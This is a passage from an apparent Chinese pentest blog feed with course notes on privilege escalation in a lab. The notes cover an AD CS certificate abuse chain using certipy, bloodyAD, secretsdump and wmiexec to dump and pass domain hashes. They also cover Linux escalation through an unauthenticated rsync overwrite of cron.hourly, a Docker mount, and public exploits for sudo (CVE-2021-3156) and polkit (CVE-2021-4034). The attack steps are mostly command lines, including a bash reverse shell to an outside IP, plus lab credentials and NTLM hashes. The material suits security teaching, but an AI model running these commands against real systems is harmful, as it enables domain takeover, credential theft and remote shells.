id="Kali添加访问域内信息-x2F-etc-x2F-hosts"><a href="#Kali添加访问域内信息-x2F-etc-x2F-hosts" class="headerlink" title="Kali添加访问域内信息 &#x2F;etc&#x2F;hosts"></a>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts</h5><p>192.168.1.15 xiaodi.local</p><p>192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA</p><p>192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local</p><h5 id="获取CA结构名和计算机名"><a href="#获取CA结构名和计算机名" class="headerlink" title="获取CA结构名和计算机名"></a>获取CA结构名和计算机名</h5><p>certutil -config - -ping</p><p>会出现</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425145210230.png" alt="image-20230425145210230"></p><h5 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h5><p>192.168.1.15</p><p>test Pass123</p><p>xiaodi-WIN-3C7SS32SQ6R-CA</p><p>WIN-3C7SS32SQ6R.xiaodi.local</p><h5 id="1、申请证书"><a href="#1、申请证书" class="headerlink" title="1、申请证书"></a>1、申请证书</h5><p>certipy req ‘xiaodi.local&#x2F;test:<a href="mailto:&#x50;&#97;&#115;&#x73;&#x31;&#50;&#x33;&#64;&#87;&#73;&#78;&#45;&#x33;&#67;&#x37;&#83;&#x53;&#x33;&#50;&#x53;&#81;&#54;&#82;&#x2e;&#x78;&#x69;&#97;&#x6f;&#x64;&#105;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;">&#x50;&#97;&#115;&#x73;&#x31;&#50;&#x33;&#64;&#87;&#73;&#78;&#45;&#x33;&#67;&#x37;&#83;&#x53;&#x33;&#50;&#x53;&#81;&#54;&#82;&#x2e;&#x78;&#x69;&#97;&#x6f;&#x64;&#105;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;</a>‘ -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150245365.png" alt="image-20230425150245365"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150350812.png" alt="image-20230425150350812"></p><h5 id="2、检测证书"><a href="#2、检测证书" class="headerlink" title="2、检测证书"></a>2、检测证书</h5><p>certipy auth -pfx test.pfx</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150424218.png" alt="image-20230425150424218"></p><h5 id="3、添加用户："><a href="#3、添加用户：" class="headerlink" title="3、添加用户："></a>3、添加用户：</h5><p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.1.15 addComputer pwnmachine ‘CVEPassword1234*’</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150521712.png" alt="image-20230425150521712"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150722870.png" alt="image-20230425150722870"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150818373.png" alt="image-20230425150818373"></p><h5 id="4、设置属性："><a href="#4、设置属性：" class="headerlink" title="4、设置属性："></a>4、设置属性：</h5><p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.1.15 setAttribute ‘CN&#x3D;pwnmachine,CN&#x3D;Computers,DC&#x3D;xiaodi,DC&#x3D;local’ dNSHostName ‘[“WIN-3C7SS32SQ6R.xiaodi.local”]’</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150845922.png" alt="image-20230425150845922"></p><h5 id="5、申请证书："><a href="#5、申请证书：" class="headerlink" title="5、申请证书："></a>5、申请证书：</h5><p>certipy req ‘xiaodi.local&#x2F;pwnmachine$:CVEPassword1234*@192.168.1.15’ -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150942298.png" alt="image-20230425150942298"></p><h5 id="6、检测证书："><a href="#6、检测证书：" class="headerlink" title="6、检测证书："></a>6、检测证书：</h5><p>certipy auth -pfx .&#x2F;win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151025181.png" alt="image-20230425151025181"></p><h5 id="7、获取HASH："><a href="#7、获取HASH：" class="headerlink" title="7、获取HASH："></a>7、获取HASH：</h5><p>python3 secretsdump.py ‘xiaodi.local&#x2F;win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local’ -hashes :10e02bef2258ad9b239e2281a01827a4</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151214180.png" alt="image-20230425151214180"></p><h5 id="8、利用HASH："><a href="#8、利用HASH：" class="headerlink" title="8、利用HASH："></a>8、利用HASH：</h5><p>python3 wmiexec.py xiaodi.local&#x2F;<a href="mailto:&#x61;&#100;&#109;&#105;&#110;&#105;&#x73;&#x74;&#x72;&#x61;&#116;&#x6f;&#114;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#46;&#x31;&#53;">&#x61;&#100;&#109;&#105;&#110;&#105;&#x73;&#x74;&#x72;&#x61;&#116;&#x6f;&#114;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#46;&#x31;&#53;</a> -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151521600.png" alt="image-20230425151521600"></p><p>windows server2012域控的ip</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151712836.png" alt="image-20230425151712836"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是域控？&quot;&gt;&lt;a href=&quot;#什么是域控？&quot; class=&quot;headerlink&quot; title=&quot;什么是域控？&quot;&gt;&lt;/a&gt;什么是域控？&lt;/h2&gt;&lt;blockquote&gt;
&lt;h4 id=&quot;域控指的就是域控制器（Domain-Controller，DC），在一个</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day105 权限提升-Linux系统&amp;Docker挂载&amp;Rsync未授权&amp;Sudo-CVE&amp;Polkit-CVE</title>
    <link href="http://example.com/2023/04/17/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/"/>
    <id>http://example.com/2023/04/17/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/</id>
    <published>2023-04-17T02:37:44.000Z</published>
    <updated>2023-04-25T06:00:22.509Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424164808411.png" alt="image-20230424164808411"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Linux提权-Rsync未授权访问覆盖</p><p>2、Linux提权-Docker组用户挂载目录</p><p>2、Linux提权-Sudo(CVE-2021-3156）</p><p>3、Linux提权-Polkit(CVE-2021-4034)</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Linux-Rsync未授权访问覆盖-本地权限"><a href="#➢-Linux-Rsync未授权访问覆盖-本地权限" class="headerlink" title="➢ Linux-Rsync未授权访问覆盖-本地权限"></a>➢ Linux-Rsync未授权访问覆盖-本地权限</h4><h4 id="➢-Linux-Docker组用户挂载目录-本地权限"><a href="#➢-Linux-Docker组用户挂载目录-本地权限" class="headerlink" title="➢ Linux-Docker组用户挂载目录-本地权限"></a>➢ Linux-Docker组用户挂载目录-本地权限</h4><h4 id="➢-Linux-Sudo-CVE-2021-3156-本地权限"><a href="#➢-Linux-Sudo-CVE-2021-3156-本地权限" class="headerlink" title="➢ Linux-Sudo(CVE-2021-3156)-本地权限"></a>➢ Linux-Sudo(CVE-2021-3156)-本地权限</h4><h4 id="➢-Linux-Polkit-CVE-2021-4034-本地权限"><a href="#➢-Linux-Polkit-CVE-2021-4034-本地权限" class="headerlink" title="➢ Linux-Polkit(CVE-2021-4034)-本地权限"></a>➢ Linux-Polkit(CVE-2021-4034)-本地权限</h4></blockquote><h3 id="Rsync未授权访问覆盖-本地"><a href="#Rsync未授权访问覆盖-本地" class="headerlink" title="#Rsync未授权访问覆盖-本地"></a>#Rsync未授权访问覆盖-本地</h3><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424165850385.png" alt="image-20230424165850385"></p><h5 id="Rsync是linux下一款数据备份工具，默认开启873端口"><a href="#Rsync是linux下一款数据备份工具，默认开启873端口" class="headerlink" title="Rsync是linux下一款数据备份工具，默认开启873端口"></a>Rsync是linux下一款数据备份工具，默认开启<code>873</code>端口</h5><p><a href="https://vulhub.org/#/environments/rsync/common/">https://vulhub.org/#/environments/rsync/common/</a></p><h5 id="借助Linux默认计划任务调用-x2F-etc-x2F-cron-hourly，利用rsync连接覆盖"><a href="#借助Linux默认计划任务调用-x2F-etc-x2F-cron-hourly，利用rsync连接覆盖" class="headerlink" title="借助Linux默认计划任务调用&#x2F;etc&#x2F;cron.hourly，利用rsync连接覆盖"></a>借助Linux默认计划任务调用&#x2F;etc&#x2F;cron.hourly，利用rsync连接覆盖</h5><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170559375.png" alt="image-20230424170559375"></p><h5 id="比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它"><a href="#比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它" class="headerlink" title="比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它"></a>比如最开始这个计时文件里面会执行nc，下面尝试用上传同样的文件名的恶意文件覆盖它</h5><h5 id="这里的nc是15-37创建的"><a href="#这里的nc是15-37创建的" class="headerlink" title="这里的nc是15:37创建的"></a>这里的nc是15:37创建的</h5><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170757729.png" alt="image-20230424170757729"></p><h5 id="提权过程："><a href="#提权过程：" class="headerlink" title="-提权过程："></a>-提权过程：</h5><h5 id="1、创建一个nc文件（vim-nc），内容"><a href="#1、创建一个nc文件（vim-nc），内容" class="headerlink" title="1、创建一个nc文件（vim nc），内容:"></a>1、创建一个nc文件（vim nc），内容:</h5><p>#!&#x2F;bin&#x2F;bash</p><p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;3333 0&gt;&amp;i</p><h5 id="2、赋予执行权限："><a href="#2、赋予执行权限：" class="headerlink" title="2、赋予执行权限："></a>2、赋予执行权限：</h5><p>chmod +x nc</p><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170257143.png" alt="image-20230424170257143"></p><h5 id="3、上传此文件覆盖定时任务目录下"><a href="#3、上传此文件覆盖定时任务目录下" class="headerlink" title="3、上传此文件覆盖定时任务目录下"></a>3、上传此文件覆盖定时任务目录下</h5><p>rsync -av nc rsync:&#x2F;&#x2F;47.94.236.117:873&#x2F;src&#x2F;etc&#x2F;cron.hourly</p><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170344696.png" alt="image-20230424170344696"></p><p>查看其目录发现已经上传，时间更新</p><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230424170457513.png" alt="image-20230424170457513"></p><h5 id="4、进行nc-监听相应的端口，等待上线"><a href="#4、进行nc-监听相应的端口，等待上线" class="headerlink" title="4、进行nc 监听相应的端口，等待上线"></a>4、进行nc 监听相应的端口，等待上线</h5><p>nc -lvnp 3333</p><h5 id="5、还可以下载敏感文件"><a href="#5、还可以下载敏感文件" class="headerlink" title="5、还可以下载敏感文件"></a>5、还可以下载敏感文件</h5><p>rsync -av rsync:&#x2F;&#x2F;47.94.236.117:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p><h3 id="Linux-Docker组用户挂载目录-本地"><a href="#Linux-Docker组用户挂载目录-本地" class="headerlink" title="#Linux-Docker组用户挂载目录-本地"></a>#Linux-Docker组用户挂载目录-本地</h3><h5 id="普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。"><a href="#普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。" class="headerlink" title="普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。"></a>普通用户在docker组，利用docker服务启动镜像挂载目录，从而来访问root目录、etc目录等敏感文件来进行权限提升。</h5><h5 id="复现操作：创建用户归类目录，添加到docker组"><a href="#复现操作：创建用户归类目录，添加到docker组" class="headerlink" title="-复现操作：创建用户归类目录，添加到docker组"></a>-复现操作：创建用户归类目录，添加到docker组</h5><ul><li><p>useradd -d &#x2F;home&#x2F;test -m  test</p></li><li><p>passwd test</p></li><li><p>usermod -G docker test</p></li><li><p>newgrp docker</p></li></ul><h5 id="利用："><a href="#利用：" class="headerlink" title="-利用："></a>-利用：</h5><ul><li><h5 id="docker-run-v-x2F-root-x2F-mnt-it-alpine"><a href="#docker-run-v-x2F-root-x2F-mnt-it-alpine" class="headerlink" title="docker run -v &#x2F;root:&#x2F;mnt -it alpine"></a>docker run -v &#x2F;root:&#x2F;mnt -it alpine</h5></li></ul><h5 id="主要的作用是：从Docker上面下载alpine镜像，然后运行"><a href="#主要的作用是：从Docker上面下载alpine镜像，然后运行" class="headerlink" title="主要的作用是：从Docker上面下载alpine镜像，然后运行;"></a>主要的作用是：从Docker上面下载alpine镜像，然后运行;</h5><h5 id="v-将容器外部的目录-x2F-root挂载-复制-到容器内部的-x2F-mnt目录-这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。"><a href="#v-将容器外部的目录-x2F-root挂载-复制-到容器内部的-x2F-mnt目录-这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。" class="headerlink" title="-v 将容器外部的目录&#x2F;root挂载(复制)到容器内部的&#x2F;mnt目录(这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。"></a>-v 将容器外部的目录&#x2F;root挂载(复制)到容器内部的&#x2F;mnt目录(这里两个目录可以随便，只要是属于root和docker下的），使用-it参数进入容器shell。</h5><h6 id="groups-用户名-，查看用户所属组发现test是docker组"><a href="#groups-用户名-，查看用户所属组发现test是docker组" class="headerlink" title="groups 用户名 ，查看用户所属组发现test是docker组"></a>groups 用户名 ，查看用户所属组发现test是docker组</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425010019424.png" alt="image-20230425010019424"></p><h6 id="用不属于docker组的用户开启docker时，会显示拒绝"><a href="#用不属于docker组的用户开启docker时，会显示拒绝" class="headerlink" title="用不属于docker组的用户开启docker时，会显示拒绝"></a>用不属于docker组的用户开启docker时，会显示拒绝</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425010224434.png" alt="image-20230425010224434"></p><h6 id="输入提权命令docker-run-v-x2F-root-x2F-mnt-it-alpine，获得root权限，提权成功"><a href="#输入提权命令docker-run-v-x2F-root-x2F-mnt-it-alpine，获得root权限，提权成功" class="headerlink" title="输入提权命令docker run -v &#x2F;root:&#x2F;mnt -it alpine，获得root权限，提权成功"></a>输入提权命令docker run -v &#x2F;root:&#x2F;mnt -it alpine，获得root权限，提权成功</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425010632068.png" alt="image-20230425010632068"></p><h3 id="Linux-Sudo-CVE-2021-3156-本地权限"><a href="#Linux-Sudo-CVE-2021-3156-本地权限" class="headerlink" title="#Linux-Sudo(CVE-2021-3156)-本地权限"></a>#Linux-Sudo(CVE-2021-3156)-本地权限</h3><p>SUDO(CVE-2021-3156）</p><blockquote><p>影响版本：</p><p>sudo: 1.8.2 - 1.8.31p2</p><p>sudo: 1.9.0 - 1.9.5p1</p></blockquote><h5 id="判断："><a href="#判断：" class="headerlink" title="-判断："></a>-判断：</h5><h5 id="1、sudo-–version查看版本"><a href="#1、sudo-–version查看版本" class="headerlink" title="1、sudo –version查看版本"></a>1、sudo –version查看版本</h5><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425011813187.png" alt="image-20230425011813187"></p><h5 id="2、sudoedit-s-x2F-（如果存在报错就有漏洞，没有报错就没漏洞）"><a href="#2、sudoedit-s-x2F-（如果存在报错就有漏洞，没有报错就没漏洞）" class="headerlink" title="2、sudoedit -s &#x2F; （如果存在报错就有漏洞，没有报错就没漏洞）"></a>2、sudoedit -s &#x2F; （如果存在报错就有漏洞，没有报错就没漏洞）</h5><h6 id="不报错："><a href="#不报错：" class="headerlink" title="不报错："></a>不报错：</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425011630706.png" alt="image-20230425011630706"></p><h6 id="报错："><a href="#报错：" class="headerlink" title="报错："></a>报错：</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425012003176.png" alt="image-20230425012003176"></p><h5 id="利用：-1"><a href="#利用：-1" class="headerlink" title="-利用："></a>-利用：</h5><ul><li>git clone <a href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156.git</a> （exp）</li><li>cd CVE-2021-3156</li><li>make （编译）</li><li>chmod a+x sudo-hax-me-a-sandwich</li><li>.&#x2F;sudo-hax-me-a-sandwich 1</li></ul><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425013404478.png" alt="image-20230425013404478"></p><h3 id="Linux-Polkit-CVE-2021-4034-本地权限"><a href="#Linux-Polkit-CVE-2021-4034-本地权限" class="headerlink" title="#Linux-Polkit(CVE-2021-4034)-本地权限"></a>#Linux-Polkit(CVE-2021-4034)-本地权限</h3><p>Polkit(CVE-2021-4034)</p><p>漏洞影响2009年5月至今的所有polkit版本</p><p>由于polkit是系统预装工具，所有存在polkit的linux系统均受影响</p><p>如：CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等</p><h5 id="判断：dpkg-l-policykit-1"><a href="#判断：dpkg-l-policykit-1" class="headerlink" title="-判断：dpkg -l policykit-1"></a>-判断：dpkg -l policykit-1</h5><h6 id="有安装"><a href="#有安装" class="headerlink" title="有安装"></a>有安装</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425112230276.png" alt="image-20230425112230276"></p><h6 id="未安装"><a href="#未安装" class="headerlink" title="未安装"></a>未安装</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425112302133.png" alt="image-20230425112302133"></p><h6 id="当提示找不到这个命令的情况下也可以尝试，也可能有漏洞"><a href="#当提示找不到这个命令的情况下也可以尝试，也可能有漏洞" class="headerlink" title="当提示找不到这个命令的情况下也可以尝试，也可能有漏洞"></a>当提示找不到这个命令的情况下也可以尝试，也可能有漏洞</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425114309859.png" alt="image-20230425114309859"></p><h5 id="利用：-2"><a href="#利用：-2" class="headerlink" title="-利用："></a>-利用：</h5><ul><li>git clone <a href="https://github.com/berdav/CVE-2021-4034.git">https://github.com/berdav/CVE-2021-4034.git</a></li><li>cd CVE-2021-4034&#x2F;</li><li>make</li><li>.&#x2F;cve-2021-4034</li></ul><h6 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425111601435.png" alt="image-20230425111601435"></p><h6 id="返回root权限"><a href="#返回root权限" class="headerlink" title="返回root权限"></a>返回root权限</h6><p><img src="/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88%E6%9D%83-Sudo-CVE-Polkit-CVE/image-20230425111701988.png" alt="image-20230425111701988"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day105-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-Docker%E6%8C%82%E8%BD%BD-Rsync%E6%9C%AA%E6%8E%88</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day104 权限提升-Linux系统&amp;环境变量&amp;定时任务&amp;权限配置不当&amp;MDUT自动化</title>
    <link href="http://example.com/2023/04/17/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <id>http://example.com/2023/04/17/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/</id>
    <published>2023-04-17T02:37:29.000Z</published>
    <updated>2023-04-24T08:47:16.580Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423165324164.png" alt="image-20230423165324164"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424164713514.png" alt="image-20230424164713514"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Linux提权-定时任务</p><p>2、Linux提权-环境变量</p><p>3、Linux提权-权限配置不当</p><p>4、Linux提权-数据库自动化</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" 